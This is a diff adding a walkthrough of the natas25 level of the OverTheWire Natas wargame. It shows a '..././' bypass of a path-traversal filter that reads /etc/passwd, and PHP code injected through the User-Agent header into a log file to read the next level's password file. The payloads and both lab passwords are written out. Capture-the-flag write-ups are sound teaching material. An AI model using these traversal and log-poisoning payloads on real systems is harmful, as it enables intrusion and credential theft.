@@ -1721,3 +1721,30 @@ Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
 ?>
 ```
 
+The application allow us to change language by `setLanguage()` function.
+
+When `setLanguage()`, the function `safeinclude()` is running to include another file.
+
+The function `safeinclude()` replace `"../"` by `""` to avoid path traversal injection, but we can bypass by using payload `..././`.
+
+Try access: http://natas25.natas.labs.overthewire.org/?lang=..././..././..././..././..././etc/passwd, we can see the response:
+
+```
+...
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync
+```
+
+The function `logRequest()` dump `$_SERVER['HTTP_USER_AGENT']` and `$message` into file `/var/www/natas/natas25/logs/natas25_{PHPSESSID}.log`. So we can inject php code into `$_SERVER['HTTP_USER_AGENT']` by custom Header User-Agent.
+
+Explore the Cookie, we have `PHPSESSID=eaufuovudsaosoirjmihb93j66`,
+
+Try access http://natas25.natas.labs.overthewire.org/?lang=..././logs/natas25_eaufuovudsaosoirjmihb93j66.log, we get log look like that:
+
+```
+[06.03.2022 20::19:41] Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 "Directory traversal attempt! fixing request." [06.03.2022 20::19:46] Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 "Directory traversal attempt! fixing request." [06.03.2022 20::20:48] Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 "Directory traversal attempt! fixing request." [06.03.2022 20::21:21] Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 "Directory traversal attempt! fixing request." [06.03.2022 20::22:29] Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 "Directory traversal attempt! fixing request." 
+```
+
+Change `User-Agent` header to: `<?php echo file_get_contents("/etc/natas_webpass/natas26");?>`, the password of natas26 will be written to the file. See log and get password `oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T`.
+
+### natas26
+
